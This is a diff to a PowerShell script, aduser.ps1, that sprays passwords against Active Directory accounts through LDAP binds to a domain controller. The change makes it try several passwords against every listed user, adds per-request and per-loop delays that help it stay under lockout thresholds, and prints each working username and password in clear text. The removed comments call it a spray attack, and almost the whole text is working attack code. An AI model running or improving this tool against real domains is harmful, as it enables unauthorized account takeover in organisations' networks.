@@ -1,8 +1,18 @@
-### HOW TO USE IT
-### spray attack via default password
-# .\aduser.ps1 -UserFile .\users.txt -PasswordFile .\default.txt -DC dc01.contoso.local -Domain CONTOSO -default -DelaySeconds 0.5 -default
-### spray attack via user own default password
-# .\aduser.ps1 -UserFile .\users.txt -PasswordFile .\default.txt -DC dc01.contoso.local -Domain CONTOSO -default -DelaySeconds 0.5 -personal
+<#
+Usage:
+  .\aduser.ps1 -UserFile users.txt -PasswordFile passwords.txt -DC dc01 -Domain contoso.local -default
+  .\aduser.ps1 -UserFile users.txt -PasswordFile passwords.txt -DC dc01 -Domain contoso.local -personal
+
+Options:
+  -default          Try each password in PasswordFile against every user in UserFile.
+  -personal         Try one password per user. The number of users and passwords must match.
+  -DelayPerRequest  Delay in seconds between individual bind attempts.
+  -DelayPerLoop     Delay in minutes between password loops in -default mode.
+
+Notes:
+  - Empty lines are ignored in both input files.
+  - Passwords are read in order from top to bottom.
+#>
 param(
     [Parameter(Mandatory=$true)]
     [string]$UserFile,
@@ -17,7 +27,10 @@ param(
     [string]$Domain,
 
     [ValidateRange(0, 3600)]
-    [double]$DelaySeconds = 0,
+    [double]$DelayPerRequest = 0,
+
+    [ValidateRange(0, 1440)]
+    [double]$DelayPerLoop = 0,
 
     [Alias("default")]
     [switch]$SharedDefault,
@@ -38,75 +51,113 @@ function Stop-Script {
     exit 1
 }
 
-$users = @(Get-Content $UserFile | ForEach-Object { $_.Trim() })
+$users = @(Get-Content $UserFile | ForEach-Object { $_.Trim() } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
 # Passwords must be read verbatim except for trailing CR from Windows line endings.
-$passwords = @(Get-Content $PasswordFile | ForEach-Object { $_.TrimEnd("`r") })
+$passwords = @(Get-Content $PasswordFile | ForEach-Object { $_.TrimEnd("`r") } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
 
 if ($SharedDefault -and $PerUser) {
-    Stop-Script "-SharedDefault and -PerUser cannot be used together."
+    Stop-Script "-SharedDefault and -personal cannot be used together."
 }
 
-if (($DelaySeconds * 10) % 1 -ne 0) {
-    Stop-Script "DelaySeconds must be specified in 0.1 second increments."
+if (($DelayPerRequest * 10) % 1 -ne 0) {
+    Stop-Script "DelayPerRequest must be specified in 0.1 second increments."
 }
 
-$mode = if ($SharedDefault) { "SharedDefault" } else { "PerUser" }
+$delayPerLoopSeconds = [int]($DelayPerLoop * 60)
+
+$mode = if ($SharedDefault) { "SharedDefault" } else { "Personal" }
 
 if ($mode -eq "SharedDefault") {
-    if ($passwords.Count -ne 1) {
-        Stop-Script "Shared default mode requires exactly one password in PasswordFile."
+    if ($passwords.Count -lt 1) {
+        Stop-Script "Shared default mode requires at least one password in PasswordFile."
     }
 }
 elseif ($users.Count -ne $passwords.Count) {
-    Stop-Script "Per-user mode requires the same number of users ($($users.Count)) and passwords ($($passwords.Count)). Use -default for a single shared password."
+    Stop-Script "Personal mode requires the same number of users ($($users.Count)) and passwords ($($passwords.Count)). Use -default to apply one or more shared passwords to all users."
 }
 
-$sharedPassword = if ($mode -eq "SharedDefault") { $passwords[0] } else { $null }
 $foundCount = 0
 
-for ($i = 0; $i -lt $users.Count; $i++) {
+if ($mode -eq "SharedDefault") {
+    for ($p = 0; $p -lt $passwords.Count; $p++) {
+        $password = $passwords[$p]
 
-    $user = $users[$i]
-    $password = if ($mode -eq "SharedDefault") { $sharedPassword } else { $passwords[$i] }
+        for ($i = 0; $i -lt $users.Count; $i++) {
+            $user = $users[$i]
 
-    if ([string]::IsNullOrWhiteSpace($user)) {
-        continue
-    }
+            $fullUser = "$Domain\$user"
 
-    $fullUser = "$Domain\$user"
+            $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
+            $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
 
-    $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
-    $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
+            try {
+                $netCred = New-Object System.Net.NetworkCredential(
+                    $user,
+                    $password,
+                    $Domain
+                )
 
-    try {
-        $netCred = New-Object System.Net.NetworkCredential(
-            $user,
-            $password,
-            $Domain
-        )
+                # Attempt exactly one bind per user/password pair.
+                $conn.Bind($netCred)
 
-        # Attempt exactly one bind per user.
-        $conn.Bind($netCred)
+                $foundCount++
+                Write-Host ("[+] {0} : {1}" -f $fullUser, $password)
+            }
+            catch {
+                continue
+            }
+            finally {
+                $conn.Dispose()
+            }
 
-        $resultText = if ($mode -eq "SharedDefault") {
-            "SHARED DEFAULT PASSWORD STILL VALID"
+            if ($DelayPerRequest -gt 0) {
+                $isLastPassword = ($p -eq ($passwords.Count - 1))
+                $isLastUser = ($i -eq ($users.Count - 1))
+
+                if (-not ($isLastPassword -and $isLastUser)) {
+                    Start-Sleep -Milliseconds ([int]($DelayPerRequest * 1000))
+                }
+            }
         }
-        else {
-            "PERSONAL DEFAULT PASSWORD STILL VALID"
+
+        if ($delayPerLoopSeconds -gt 0 -and $p -lt ($passwords.Count - 1)) {
+            Start-Sleep -Seconds $delayPerLoopSeconds
+        }
+    }
+}
+else {
+    for ($i = 0; $i -lt $users.Count; $i++) {
+        $user = $users[$i]
+        $password = $passwords[$i]
+
+        $fullUser = "$Domain\$user"
+
+        $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
+        $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate
+
+        try {
+            $netCred = New-Object System.Net.NetworkCredential(
+                $user,
+                $password,
+                $Domain
+            )
+
+            # Attempt exactly one bind per user/password pair.
+            $conn.Bind($netCred)
+
+            $foundCount++
+            Write-Host ("[+] {0} : {1}" -f $fullUser, $password)
+        }
+        catch {
+            continue
+        }
+        finally {
+            $conn.Dispose()
         }
 
-        $foundCount++
-        Write-Host ("[{0}] {1}" -f $resultText, $fullUser)
-    }
-    catch {
-        continue
-    }
-    finally {
-        $conn.Dispose()
-    }
-
-    if ($DelaySeconds -gt 0 -and $i -lt ($users.Count - 1)) {
-        Start-Sleep -Milliseconds ([int]($DelaySeconds * 1000))
+        if ($DelayPerRequest -gt 0 -and $i -lt ($users.Count - 1)) {
+            Start-Sleep -Milliseconds ([int]($DelayPerRequest * 1000))
+        }
     }
 }
 
